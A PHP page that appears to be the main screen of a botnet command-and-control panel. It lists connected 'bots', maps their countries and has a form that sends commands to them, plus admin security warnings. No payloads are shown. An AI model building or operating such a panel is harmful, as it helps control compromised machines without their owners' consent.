<?php
include_once 'session.php';
include_once APP_PATH . '/classes/Clients.php';
include_once APP_PATH . '/utils/getcontery.php';
include_once APP_PATH . '/logic/homeLogic.php';
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include_once 'components/meta.php';?>
    <title><?php echo APP_NAME; ?> - Main Interface</title>
    <?php include_once 'components/css.php';?>
    <link
      href="assets/vendor/datatables/dataTables.bootstrap4.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="assets/vendor/jvector/css/jvector.css"
    />
  </head>

  <body id="page-top">
    <?php include_once 'components/header.php';?>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <?php $utils->show_input("theme_mode", $theme_name);?>

          <?php if ($_SESSION['login_user'] == "admin"): ?>

          <?php $utils->show_dismissible_alert('<b> Warning!</b> You are loging
                      in as "admin" please change your <b>username</b> for better
                      security.', "warning", "exclamation-triangle");?>

          <?php endif;?>


          <?php if ($auth->isTwoFAEnabled($_SESSION['login_user']) == "off"): ?>

            <?php $utils->show_dismissible_alert('<b> Warning!</b> Your account is not protected by two-factor authentication. Enable two-factor authentication now from <a href="authsettings.php" class="alert-link">here</a>.', "warning", "exclamation-triangle");?>

          <?php endif;?>


          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Bots Menu</a>
            </li>
          </ol>

          <?php include_once 'components/stats.php';?>

          <form method="POST" action="sendcommand.php" id="Form1" name="Form1">
            <?php $utils->show_input("csrf", $utils->sanitize($_SESSION['csrf']));?>

            <?php include_once 'components/clientsList.php';?>

            <div class="row">
              <?php include_once 'components/commands.php';?>
              <div class="col-12 col-sm-12 col-md-8 col-lg-6">
                <div class="card mb-3">
                  <div class="card-header">
                    <i class="fas fa-map-marker-alt"></i>
                    Map Visualization
                  </div>
                  <div class="card-body">
                    <div class="map-container">
                      <div
                        id="clientmap"
                        name="clientmap"
                        class="jvmap-smart"
                      ></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>

    <?php include_once 'components/footer.php';?>

    <?php include_once 'components/js.php';?>

    <script src="assets/vendor/datatables/jquery.dataTables.js"></script>
    <script src="assets/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="assets/js/demo/datatables-demo.js"></script>
    <script src="assets/vendor/jvector/js/core.js"></script>
    <script src="assets/vendor/jvector/js/world.js"></script>
    <script src="assets/js/main.js"></script>
  </body>
</html>
